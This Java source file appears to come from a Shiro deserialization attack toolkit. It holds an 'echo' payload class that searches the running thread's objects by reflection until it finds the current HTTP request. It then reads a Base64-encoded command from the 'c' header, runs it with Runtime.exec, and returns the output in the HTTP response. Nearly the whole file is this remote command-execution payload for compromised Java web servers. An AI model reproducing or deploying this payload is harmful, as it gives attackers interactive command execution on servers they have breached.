package com.summersec.attack.deser.echo;

/**
 * @ClassName: dfs
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/12/9 13:45
 * @Version: v1.0.0
 * @Description:
 **/
public class dfs {

    static java.util.HashSet<Object> h;
    static javax.servlet.http.HttpServletRequest r;
    static javax.servlet.http.HttpServletResponse p;

    public dfs(){

        r = null;
        p = null;
        h =new java.util.HashSet<Object>();
        F(Thread.currentThread(),0);
    }

    private static boolean i(Object obj){
        if(obj==null|| h.contains(obj)){
            return true;
        }
        h.add(obj);
        return false;
    }
    private static void p(Object o, int depth){
        if(depth > 52||(r !=null&& p !=null)){
            return;
        }
        if(!i(o)){
            if(r ==null&&javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())){
                r = (javax.servlet.http.HttpServletRequest)o;
                if(r.getHeader("Ctmd")==null && r.getHeader("c") == null) {
                    r = null;
                }else{
                    try {
                        p = (javax.servlet.http.HttpServletResponse) r.getClass().getMethod("getResponse",null).invoke(r,null);

                    } catch (Exception e) {
                        r = null;
                    }
                }

            }
            if(r !=null&& p !=null){
                try {

                    if (r.getHeader("Ctmd") != null) {
                        p.addHeader("techo",r.getHeader("Ctmd"));
                    }else {
                        p.getWriter().println("$$$" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader("c"))).getInputStream()).useDelimiter("\\A").next().getBytes()) + "$$$");
                        p.getWriter().flush();
                        p.getWriter().close();
                    }


                }catch (Exception e){
                }
                return;
            }

            F(o,depth+1);
        }
    }
    private static void F(Object start, int depth){

        Class n=start.getClass();
        do{
            java.lang.reflect.Field f = null;
            int l = n.getDeclaredFields().length;
            for (int i = 0; i < l; i++) {
                f = n.getDeclaredFields()[i];
                f.setAccessible(true);
                Object o = null;
                try{
                    o = f.get(start);

                    if(!o.getClass().isArray()){
                        p(o,depth);
                    }else{
                        Object q = null;
                        Object[] objs = (Object[])o;
                        int len = java.lang.reflect.Array.getLength(o);
                        for (int j = 0; j < len; j++) {
                            q = objs[j];
                            p(q, depth);
                        }

                    }

                }catch (Exception e){
                }
            }

        }while(
                (n = n.getSuperclass())!=null
        );
    }
}
